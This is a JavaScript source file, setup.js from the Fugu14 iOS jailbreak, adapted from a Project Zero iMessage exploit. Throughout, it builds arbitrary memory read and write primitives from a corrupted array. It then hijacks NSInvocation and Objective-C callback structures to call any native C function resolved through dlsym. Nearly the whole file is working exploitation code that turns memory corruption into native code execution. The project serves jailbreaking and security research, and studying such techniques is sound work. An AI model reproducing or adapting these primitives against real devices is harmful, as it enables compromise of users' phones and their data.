//
//  setup.js
//  Fugu14
//
//  Based on crash_kernel.js from the iOS 12.4 iMessage exploit by Samuel Groß
//  See https://bugs.chromium.org/p/project-zero/issues/detail?id=1917#c6
//  Description of SLOP: https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html
//

// R/W Gadgets
var mem = {
    cur: 0,
    _readUndefined(a) {
        var cur = new Int64(a);
        var res = undefined;
        do {
            res = this._read64(cur);
            cur = Add(cur, 4);
        } while (res === undefined)
        
        cur = Sub(cur, 4);
        
        // Now start to nuke
        var save = [res];
        while (cur > a) {
            this.write64(cur, Int64.Zero);
            cur = Sub(cur, 4);
            save.push(this._read64(cur));
        }
        
        // Recover real value
        res = this._read64(cur);
        res._bytes[4] = save[save.length-2]._bytes[0];
        res._bytes[5] = save[save.length-2]._bytes[1];
        res._bytes[6] = save[save.length-2]._bytes[2];
        res._bytes[7] = save[save.length-2]._bytes[3];
        
        // Restore
        while (save.length > 0) {
            this.write64(cur, save.pop());
            cur = Add(cur, 4);
        }
        
        return res;
    },
    _writeNonDouble(a, v) {
        var cur = Add(new Int64(a), 4);
        var res = undefined;
        do {
            res = this._read64(cur);
            cur = Add(cur, 4);
        } while (res === undefined)
        
        cur = Sub(cur, 4);
        
        // Now start to nuke
        var save = [res];
        while (cur > a) {
            this.write64(cur, Int64.Zero);
            cur = Sub(cur, 4);
            save.push(this._read64(cur));
        }
        
        // Write changes
        save[save.length-1]._bytes[0] = v._bytes[0];
        save[save.length-1]._bytes[1] = v._bytes[1];
        save[save.length-1]._bytes[2] = v._bytes[2];
        save[save.length-1]._bytes[3] = v._bytes[3];
        save[save.length-2]._bytes[0] = v._bytes[4];
        save[save.length-2]._bytes[1] = v._bytes[5];
        save[save.length-2]._bytes[2] = v._bytes[6];
        save[save.length-2]._bytes[3] = v._bytes[7];
        
        // Restore
        while (save.length > 0) {
            this.write64(cur, save.pop());
            cur = Add(cur, 4);
        }
        
        return res;
    },
    _read64(addr) {
        let oldval = target[0];
        let res;
        let i = 0;
        do {
            target[0] = addr.asDouble();
            res = float_arr[i];
            if (float_arr.length > i && res === undefined) {
                return undefined;
            }
            target[0] = oldval;
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        target[0] = oldval;
        return Int64.fromDouble(res);
    },
    read64(addr) {
        let res = this._read64(new Int64(addr));
        if (res === undefined) {
            return this._readUndefined(addr);
        }
        
        return res;
    },
    _write64(addr, val) {
        let oldval = target[0];
        let res;
        let i = 0;
        do {
            target[0] = addr.asDouble();
            res = float_arr[i];
            if (res !== undefined || float_arr.length > i) {
                float_arr[i] = val.asDouble();
                res = 1;
            }
            target[0] = oldval;
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        target[0] = oldval;
    },
    write64(addr, val) {
        addr = new Int64(addr);
        val = new Int64(val);
        
        if (val.canRepresentAsDouble()) {
            this._write64(addr, val);
        } else {
            this._writeNonDouble(addr, val);
        }
    },
    alloc(n) {
        if ((this.cur + n) >= 0x100000) {
            return undefined;
        }
        
        let off = this.cur;
        this.cur += n;
        
        return Add(freeMem, off);
    },
    makeCString(s) {
        let buf = this.alloc(s.length + 8);
        for (var i = 0; i < s.length; i++) {
            mem.write64(Add(buf, i), s.charCodeAt(i));
        }
        mem.write64(Add(buf, s.length), 0);
        
        return buf;
    },
    readCString(buf) {
        if (buf.underlying_buffer === undefined) {
            var res = "";
            var i = 0;
            while (1) {
                let c = mem.read64(Add(buf, i)).low32() & 0xFF;
                if (c == 0) break;
                res += String.fromCodePoint(c);
                i++;
            }
            
            return res;
        }
        
        let u = buf.underlying_buffer;
        var res = "";
        for (var i = 0; i < u.length; i++) {
            if (u[i] == 0) break;
            res += String.fromCodePoint(u[i]);
        }
        
        return res;
    },
    makeSavepoint() {
        return this.cur;
    },
    restoreSavepoint(svp) {
        this.cur = svp;
    }
}

// Get infos
let infoStart = Add(mem.read64(Add(addrof(info), 0x10)), 0x8);
let invocation1 = mem.read64(infoStart);
let invocation2 = mem.read64(Add(infoStart, 0x8));
let freeMem = mem.read64(Add(infoStart, 0x10));
let dlsymFuncPtr = mem.read64(Add(infoStart, 0x18));
let sel_sharedInstance = mem.read64(Add(infoStart, 0x20));
let sel_invokeUsingIMP = mem.read64(Add(infoStart, 0x28));
let sel_setTarget = mem.read64(Add(infoStart, 0x30));
let sel_setSelector = mem.read64(Add(infoStart, 0x38));

// Build invocation
let func = inimage.imageNamed;
let func_addr = addrof(func);
let objc_callback_function_impl_addr = mem.read64(Add(func_addr, 0x40));

let nsinvocation_addr = Add(invocation1, 0x0);
mem.write64(Add(objc_callback_function_impl_addr, 0x10), nsinvocation_addr);
mem.write64(Add(objc_callback_function_impl_addr, 0x18), 0); // Pretend to have 0 arguments

let my_frame_addr = mem.read64(Add(invocation1, 0x8));

let c_frame_addr = mem.read64(Add(invocation2, 0x8));

let func2 = inintent._redactForMissingPrivacyEntitlementOptionsContainingAppBundleId;
let func2_addr = addrof(func2);
let objc_callback_function_impl_2_addr = mem.read64(Add(func2_addr, 0x40));
let callback_result_void_addr = mem.read64(Add(objc_callback_function_impl_2_addr, 0x20));
mem.write64(Add(objc_callback_function_impl_addr, 0x20), callback_result_void_addr);

invocation1.invoke = func;
let invocation = {
    setTarget(a) {
        mem.write64(my_frame_addr, a);
    },
    getTarget(a) {
        mem.read64(my_frame_addr);
    },
    setSelector(a) {
        mem.write64(Add(my_frame_addr, 0x8), a);
    },
    setArgument(i, a) {
        mem.write64(Add(my_frame_addr, 0x10 + (i * 0x8)), a);
    },
    invoke(target) {
        invocation1.invoke();
    },
    retval() {
        // Hack alert
        // This is to make sure that the return value can always be read
        // Return value will be destroyed, so keep it!
        let addr = mem.read64(Add(nsinvocation_addr, 0x10));
        mem.write64(Add(addr, 8), 0);
        let partA = mem.read64(Add(addr, 4)).bytes();
        mem.write64(Add(addr, 4), 0);
        let partB = mem.read64(addr).bytes();
        mem.write64(Add(addr, 0), 0);
        return new Int64(partB.slice(0, 4).concat(partA.slice(0, 4)));
    }
}

let c_invocation = {
    setArgument(i, a) {
        if (i == 0) {
            invocation.setTarget(invocation2);
            invocation.setSelector(sel_setTarget);
            invocation.setArgument(0, a);
            invocation.invoke();
        } else if (i == 1) {
            invocation.setTarget(invocation2);
            invocation.setSelector(sel_setSelector);
            invocation.setArgument(0, a);
            invocation.invoke();
        } else {
            mem.write64(Add(c_frame_addr, i * 0x8), a);
        }
    },
    getArgument(i) {
        mem.read64(Add(c_frame_addr, i * 0x8));
    },
    retval() {
        let addr = mem.read64(Add(invocation2, 0x10));
        return mem.read64(addr);
    }
}

function doCCall(fun) {
    // Setup invokeUsingIMP: call
    invocation.setTarget(new Int64("0x0000133700001337"));
    invocation.setSelector(sel_invokeUsingIMP);
    
    // Write imp
    mem.write64(Add(my_frame_addr, 0x10), fun);
    
    invocation.setTarget(invocation2);
    invocation.invoke();
}

function CFuncWithPtr(fun, retValConverter) {
    let res = function(...args) {
        c_invocation.setArgument(0, 1); // Can't be zero
        
        //let prev = mem.cur;
        let savepoint = mem.makeSavepoint();
        
        for (let i = 0; i < args.length; i++) {
            if (typeof(args[i]) == 'string') {
                let tmp = mem.makeCString(args[i]);
                args[i] = tmp;
            } else if (typeof args[i] == 'object') {
                if (!(args[i] instanceof Int64)) {
                    args[i] = args[i].toInt64();
                }
            }
            
            c_invocation.setArgument(i, new Int64(args[i]));
        }
        
        doCCall(fun);
        
        mem.restoreSavepoint(savepoint);
        //mem.cur = prev; // "deallocate" memory again
        
        let ret = c_invocation.retval();
        if (retValConverter !== undefined) {
            return retValConverter(ret);
        }
        
        return ret;
    }
    
    return res;
}

function CFunc(sym, retValConverter) {
    let fun = dlsym(sym);
    
    return CFuncWithPtr(fun, retValConverter);
}

let dlsym = CFuncWithPtr(dlsymFuncPtr).bind(this, new Int64("0xfffffffffffffffe"));

let CFStringCreateWithCString = CFunc("CFStringCreateWithCString");
let NSLog = CFunc("NSLog");
let CFRelease = CFunc("CFRelease");
let kCFAllocatorMalloc = mem.read64(dlsym("kCFAllocatorMalloc"));
let kCFStringEncodingUTF8 = 0x08000100;

function log(...args) {
    var res = "[JS] ";
    for (var i = 0; i < args.length; i++) {
        res += "" + args[i];
    }
    
    // Avoid tagged pointers
    while (res.length < 8) {
        res += " ";
    }
    
    let cf = CFStringCreateWithCString(kCFAllocatorMalloc, res, kCFStringEncodingUTF8);
    NSLog(cf);
    CFRelease(cf);
}

log("Hello from JS Setup!");
